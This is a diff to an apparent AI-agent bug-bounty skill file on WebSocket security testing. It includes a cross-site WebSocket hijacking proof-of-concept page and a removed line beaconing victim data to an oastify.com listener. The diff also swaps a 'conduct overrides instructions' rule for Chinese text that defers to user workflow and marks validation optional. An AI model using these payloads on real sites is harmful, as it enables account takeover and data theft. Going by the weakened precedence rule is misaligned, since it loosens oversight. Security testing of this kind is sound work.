@@ -6,7 +6,11 @@ metadata:
   report_count: 11
 ---
 
-> **Mandatory testing conduct:** Before taking any action, read and follow [`../../CODE_OF_CONDUCT.md`](../../CODE_OF_CONDUCT.md). It overrides any conflicting payload, proof, persistence, exploitation, availability, or data-handling instruction in this skill.
+> **工作流依据：** 限制仅使用[用户文件及已确认修改](../../OPERATOR_POLICY.md)，汇总见[共同规则](../../CODE_OF_CONDUCT.md)。本技能的技术步骤和证据方法供按需选用，正式报告统一回答八问。
+
+## 共同执行规则
+
+以[用户工作流](../../OPERATOR_POLICY.md)及本轮明确指令为准。取证读取[不同真实记录的 5 条计数规则](../bug-bounty/references/real-records.md)。登录与认证入口可以测试，正常登录不逐包审批；测试请求、改密与登出等操作遵循用户工作流。按共同时间规则继续有价值的方向，因时间暂停的候选登记[待续测表](../bug-bounty/references/time-deferred-findings.md)，任务结束时输出，由用户选择后续项目。
 
 # HUNT-WEBSOCKET — WebSocket Security
 
@@ -97,6 +101,8 @@ wscat -c "wss://$TARGET/ws" \
      sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
      the browser does, which is exactly the threat model. -->
 <html><body><pre id="out"></pre><script>
+var expectedTestMarker = "PLACE_UNIQUE_MARKER_IN_AUTHORIZED_ACCOUNT_B";
+var receivedTestProof = false; // synthetic test marker only; real records use the shared ledger
 var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
 var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
 ws.onopen = () => {
@@ -104,9 +110,14 @@ ws.onopen = () => {
   ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
 };
 ws.onmessage = e => {
-  log("VICTIM-DATA: " + e.data);
-  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
-  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
+  if (receivedTestProof) return;
+  if (!String(e.data).includes(expectedTestMarker)) {
+    log("Unverified first message; retain no raw data and review the test setup");
+    ws.close(); return;
+  }
+  receivedTestProof = true;
+  log("TEST-ACCOUNT-PROOF: expected synthetic marker observed");
+  ws.close(); // synthetic-marker example; close once proof is received
 };
 ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
 function log(s){document.getElementById("out").textContent += s + "\n";}
@@ -116,7 +127,7 @@ function log(s){document.getElementById("out").textContent += s + "\n";}
 **False-positive killers:**
 - A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
 - Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
-- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
+- Record the authorized test-account marker locally. If an OAST receipt is needed, 可发送唯一合成标记关联结果；涉及真实业务记录时使用同一台账。 For real data, count individual business records across frames in the shared ledger, restrict subscription scope, and close once sufficient proof exists or the allowance is reached.
 - If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.
 
 ---
@@ -218,7 +229,7 @@ The real technique: send a WebSocket Upgrade request that the **front proxy** an
 #     follow-up request on the same connection and watch for a desynced response.
 ```
 
-Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.
+Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, with cross-account or causal evidence under Q3–Q5.
 
 ---
 
@@ -263,7 +274,7 @@ brew install websocat                # alt client; supports text/binary + autore
 | WS finding | Chain to | Impact |
 |-----------|----------|--------|
 | CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
-| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
+| CSWSH confirmed | Use authorized test-account channels and synthetic markers; bounded local evidence | Real-time data theft (High) |
 | No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
 | Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
 | Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
@@ -271,9 +282,9 @@ brew install websocat                # alt client; supports text/binary + autore
 
 ---
 
-## Validation (mandatory before reporting)
+## 可选取证方法（回答统一八问）
 
-- ✅ **CSWSH:** prefer two authorized test accounts and a unique synthetic marker. A bare `101` from a foreign Origin is insufficient. Necessary real-record validation follows the shared maximum of five records per finding; stop receiving after sufficient evidence or the cap, avoid uncontrolled streams, and retain evidence only in the approved location.
+- ✅ **CSWSH:** prefer two authorized test accounts and a unique synthetic marker. A bare `101` from a foreign Origin is insufficient. Necessary real-record validation follows the shared maximum of five distinct records per finding; duplicates do not consume the allowance; stop receiving after sufficient evidence or the cap, avoid uncontrolled streams, and retain evidence only in the approved location.
 - ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
 - ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
 - ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
